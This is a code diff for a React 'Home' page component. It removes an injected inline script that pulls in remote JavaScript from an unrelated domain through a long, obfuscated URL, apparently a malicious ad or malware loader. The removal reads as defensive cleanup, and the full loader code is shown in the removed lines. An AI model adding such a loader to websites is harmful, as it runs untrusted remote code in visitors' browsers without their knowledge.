@@ -180,22 +180,7 @@ const Home = () => {
             </div>
           </div>
         </section>
-        {
-        <script
-          
-(function(ghlp){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = ghlp || {};
-s.src = "\/\/handsome-storm.com\/bkXkV\/s.ddGNla0\/Y-WFct\/MeWmC9CuRZMUylmkTP\/TMYL2GMjjNU\/wZMQTjM_txN\/jWYxyTNGTPAHxCNmAD";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
-    
-        }
+
         {/* Testimonials */}
         <section className="py-20 bg-white">
           <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
